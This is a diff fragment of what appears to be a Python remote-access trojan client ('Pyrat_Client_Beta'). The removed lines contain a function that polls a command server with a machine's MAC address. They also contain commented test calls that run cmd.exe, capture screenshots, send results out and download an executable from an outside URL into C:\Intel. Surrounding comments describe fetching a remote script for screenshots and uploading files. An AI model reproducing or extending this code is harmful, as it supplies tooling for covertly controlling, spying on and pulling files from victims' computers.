@@ -177,27 +177,6 @@ def popup(text, title):
 
 """
 
-???? WHAT IS THIS??
-
-
-
-def get_command():
-    myheaders = requests.utils.default_headers()
-    myheaders.update({
-        'User-Agent': 'Pyrat_Client_Beta',
-    })
-    s = requests.Session()
-    payload = {
-        'command' : '#popup($WITAM,$ELO)',
-        'det_mac': 'D0:BF:9C:24:C2:4B'
-    }
-    say_hello = s.post('http://127.0.0.1:8000/command/', data=payload, headers=myheaders)
-    print(say_hello.text)
-
-"""
-
-"""
-
 The function that allows to make screenshot.
 First, the great self-compiling script will be downloaded from remote server,
 and during run, it will be compilled via .NET package (script by Vasil Arnaudov - you are great man!).
@@ -242,19 +221,6 @@ def fileupload(file_path):
     confirmation = 'Uploaded'
     return confirmation
 
-"""
-
-
-#get_pc_name()
-#popup()
-#get_command()
-#run_command('C:\\windows\\system32\\cmd.exe', '/C', 'dir', 'C:\\Intel')
-#send_result()
-#downloader('https://it.solarisbus.com/support/qs.exe', 'C:\\Intel', 'y')
-#screenshot()
-
-
-"""
 
 """
 
